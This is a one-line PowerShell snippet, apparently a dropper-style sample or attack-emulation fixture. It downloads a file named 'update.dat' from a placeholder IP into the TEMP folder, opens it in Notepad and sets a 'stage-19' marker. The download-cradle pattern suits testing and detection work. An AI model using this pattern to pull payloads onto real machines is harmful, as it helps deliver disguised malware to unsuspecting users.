
$PayloadUrl = "https://198.51.100.89:443/update.dat"; $WorkingPath = "$env:TEMP\update.dat"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $WorkingPath); Start-Process -FilePath "notepad.exe" -ArgumentList $WorkingPath; $StageMarker = "stage-19"
